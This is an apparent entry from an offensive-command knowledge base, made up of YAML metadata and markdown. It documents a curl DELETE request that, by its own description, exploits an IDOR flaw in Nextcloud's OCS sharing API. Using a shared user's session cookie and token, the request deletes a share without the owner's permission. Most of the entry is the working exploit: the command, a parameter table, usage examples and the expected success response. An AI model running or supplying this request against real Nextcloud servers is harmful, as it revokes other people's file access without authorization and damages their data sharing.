---
id: cmd-uuid-001
data: >-
  curl -X DELETE
  "https://[your-host]/nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101
  Firefox/47.0" -H "Accept: */*" -H "Accept-Language: en-US,en;q=0.5" -H
  "Accept-Encoding: gzip, deflate" -H "requesttoken: [token-of-shared-user]" -H
  "OCS-APIREQUEST: true" -H "X-Requested-With: XMLHttpRequest" -H "Cookie:
  [cookie-of-shared-user]" --connect-timeout 10
tags:
  - api
  - delete
  - nextcloud
type: command
output: '{"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":[]}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.568Z'
verified: false
validated: true
submitted: true
---
# delete-nextcloud-share

## Command

```bash
curl -X DELETE "https://[your-host]/nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "requesttoken: [token-of-shared-user]" \
  -H "OCS-APIREQUEST: true" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: [cookie-of-shared-user]" \
  --connect-timeout 10
```

## Description

This curl command exploits an IDOR vulnerability in Nextcloud's OCS API by sending a DELETE request to remove a share using a shared user's credentials. It revokes access for all recipients without owner permission, targeting the /shares/[share-id] endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[your-host]` | Nextcloud server hostname or IP | Yes |
| `[share-id]` | Unique ID of the share to delete (obtained from API or interface) | Yes |
| `[token-of-shared-user]` | CSRF requesttoken from the shared user's session | Yes |
| `[cookie-of-shared-user]` | Session cookie from the shared user's authentication | Yes |
| `format=json` | Response format (JSON) | Yes |
| `OCS-APIREQUEST: true` | Enables OCS API mode | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE "https://nextcloud.example.com/ocs/v2.php/apps/files_sharing/api/v1/shares/123?format=json" \
  -H "requesttoken: abc123" \
  -H "OCS-APIREQUEST: true" \
  -H "Cookie: nc_session=def456"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X DELETE "https://nextcloud.example.com/ocs/v2.php/apps/files_sharing/api/v1/shares/123?format=json" \
  -H "requesttoken: abc123" \
  -H "OCS-APIREQUEST: true" \
  -H "Cookie: nc_session=def456" \
  -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A successful response indicates share deletion: {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":[]}}. Failure (e.g., invalid token) returns 401 or 403 with error details. Verify by checking resource access post-execution.

## Related

- [[procedures/Exploit-Nextcloud-IDOR-to-Revoke-Shares]]
